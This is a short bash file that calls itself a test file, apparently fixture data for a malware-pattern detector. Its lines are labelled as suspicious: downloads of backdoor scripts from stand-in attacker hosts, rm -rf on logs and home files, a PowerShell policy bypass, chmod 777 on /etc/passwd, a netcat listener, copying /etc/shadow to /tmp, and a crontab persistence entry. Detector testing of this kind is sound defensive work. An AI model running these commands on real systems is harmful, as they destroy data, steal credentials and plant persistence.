#!/bin/bash
# Shell Injection Script - Test File 3
# Contains various shell-based malware patterns

# Suspicious: Downloading malware
wget http://malicious-domain.com/rootkit.sh
curl http://evil-server.net/backdoor.sh -o /tmp/backdoor.sh

# Suspicious: Destructive commands
rm -rf /var/log/*
rm -rf /home/user/important_files

# Suspicious: PowerShell execution (if on Windows)
powershell -ExecutionPolicy Bypass -File evil.ps1
powershell -Command "Invoke-WebRequest http://attacker.com/payload"

# Suspicious: Privilege escalation attempts
chmod 777 /etc/passwd
chmod +x /tmp/malware.sh

# Suspicious: Network scanning
nmap -sS 192.168.1.0/24
nc -lvp 4444

# Suspicious: Credential harvesting
cat /etc/shadow > /tmp/passwords.txt
grep -r "password" /home/* > /tmp/creds.txt

# Suspicious: Cron job for persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab

# Clean commands (should not be detected as much)
ls -la
cd /home/user
echo "Hello World"
